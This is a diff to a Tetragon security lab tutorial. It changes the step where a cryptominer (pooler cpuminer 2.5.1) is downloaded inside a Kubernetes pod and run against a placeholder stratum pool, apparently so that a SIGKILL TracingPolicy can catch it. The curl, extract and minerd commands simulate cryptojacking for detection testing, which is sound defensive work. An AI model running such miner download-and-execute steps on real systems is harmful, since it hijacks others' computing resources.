@@ -364,21 +364,21 @@ wget https://raw.githubusercontent.com/nigeldouglas-itcarlow/Tetragon-Lab/main/T
 cat multi-binary-sigkill.yaml
 ```
 After you've run ```kubectl apply -f``` on the above ```TracingPolicy```, we can exec back into the ```nigel-app``` pod. <br/>
-From here we can download and run the second ```cpuminer``` binary.
+From here we can download and run the second ```minerd``` binary.
 ```
-curl -LO https://github.com/tpruvot/cpuminer-multi/releases/download/v1.3.8/cpuminer-multi-1.3.8.tar.gz
-```
-
-```
-tar -xf cpuminer-multi-1.3.8.tar.gz
+curl -LO https://github.com/pooler/cpuminer/releases/download/v2.5.1/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz
 ```
 
 ```
-cd cpuminer-multi-1.3.8
+tar -xf pooler-cpuminer-2.5.1-linux-x86_64.tar.gz
 ```
 
 ```
-./cpuminer -a <algorithm> -o <pool-url> -u <username> -p <password>
+cd cpuminer-2.5.1
+```
+
+```
+./minerd -a scrypt -o stratum+tcp://pool.example.com:3333 -u johnsmith.worker1 -p mysecretpassword
 ```
 
 ## Background Checks
